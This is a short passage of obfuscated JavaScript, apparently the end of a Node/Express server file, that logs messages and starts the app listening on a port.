_0x4c73be=_0x12489e;console[_0x4c73be(0x12a)](_0x4c73be(0x149),_0x37d5dd);}),app[_0x12489e(0x12e)](PORT,()=>console[_0x12489e(0xd2)](_0x12489e(0x12b)+PORT+'!'));
